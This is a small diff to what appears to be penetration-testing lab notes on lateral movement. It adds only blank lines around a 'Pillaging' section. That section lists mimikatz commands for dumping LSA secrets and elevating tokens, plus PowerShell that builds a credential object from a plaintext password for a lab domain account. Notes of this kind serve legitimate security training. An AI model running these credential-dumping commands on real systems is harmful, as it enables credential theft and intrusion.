@@ -168,11 +168,13 @@ tag:lateral-movement
 ```
 
 ** Pillaging** 
+
 ```
 mimikatz.exe 
 lasadump::secrets
 token::elevate
 ```
+
 ```
 $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
